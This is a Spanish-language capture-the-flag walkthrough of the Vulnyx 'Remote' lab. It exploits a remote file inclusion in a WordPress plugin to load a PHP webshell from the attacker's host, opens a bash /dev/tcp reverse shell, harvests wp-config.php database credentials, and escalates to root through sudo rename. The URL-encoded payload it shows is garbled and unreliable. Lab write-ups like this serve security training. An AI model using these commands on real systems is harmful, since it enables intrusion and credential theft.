# Vulnyx-Remote

### Reconocimiento

```bash
# ARP scan
arp-scan -I eth0 --localnet
•(IP-victima)  08:00:27:a3:d1:62       PCS Systemtechnik GmbH

# Nmap scan
nmap -p 22,80 -sS -sC -sV  -n -Pn (IP-victima) -oN nmap
•22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
•80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

### Fuzzing

```bash
# WFuzz
wfuzz -c --hc=404  -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://(IP-victima)/FUZZ
•/wordpress
```

Dentro de "/wordpress" encontramos un href que nos redirecciona a un dominio:
•href='//remote.nyx'

Asociamos el dominio a la IP en el archivo hosts:

```bash
nano /etc/hosts
•(IP-victima)	remote.nyx
```

Continuamos fuzzing:

```bash
wfuzz -c --hc=404  -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://(IP-victima)/wordpress/FUZZ
•/wp-content
•/wp-includes
•/wp-admin
```

### Enumeración de Usuarios y Plugins

```bash
# WPScan
wpscan --url http://remote.nyx/wordpress --enumerate p,u --plugins-detection aggressive

Encontramos usuarios:
•tiago

Pluggins:
•akismet 5.2
•gwolle.gb 1.5.3
```

Buscamos exploits para atacar los plugins y encontramos uno [aquí](https://www.exploit-db.com/exploits/38861). Usando el siguiente comando:

```bash
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[hackers_website]
```

Creamos una webshell:

```bash
nano pwned.phpwp-load.php
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Creamos un servidor Python para alojar la webshell:

```bash
python3 -m http.server 80
```

Subimos la webshell al servidor WordPress:

```bash
http://192.168.200.10/wordpress//wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://(IP-atacante)/pwned.php
```

Probamos ejecutar comandos:

```bash
http://192.168.200.10/wordpress//wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://192.168.200.5/pwned.php&cmd=whoami
•www-data
```

### Reverseshell

```bash
bash -i >& /dev/tcp/(IP-atacante)/443 0>&1
```

La ejecutamos urlencodeada:

```bash
%62%61%73%68%260%2sd%63%20%222%623%61%73%268%20%42d%692%20%3e2%22262%202%22f%64%26252%276%2f%7224%63%70%2f%31%3922%32a%2es%3d1%36%f3f8g%2hes%s32%30%30%2e%35%2f%34s%d3f4%33%20%30%3e%26%31%22
```

Antes de ejecutarla, iniciamos Netcat:

```bash
nc -nlvp 443
```

Ejecutamos el comando urlencodeado y obtenemos acceso como `www-data`.

Ahora, mejoramos la TTY:

```bash
script /dev/null -c bash
control+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Buscamos la ruta por defecto de la base de datos de WordPress y encontramos "wp-config.php":

```bash
cat wp-config.php
```

Encontramos credenciales:

```php
/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'W**********!' );
```

Probamos las credenciales con el usuario `tiago`:

```bash
su tiago
pass: W*********!
whoami
•tiago
```

Escalamos a root:

```bash
sudo -l
•(root) NOPASSWD: /usr/bin/rename
sudo -u root /usr/bin/rename --help
Vemos que tenemos una opcion "man" que nos dara una shell

sudo -u root /usr/bin/rename --man
!/bin/bash
whoami
•root
```

Ya somos root :D
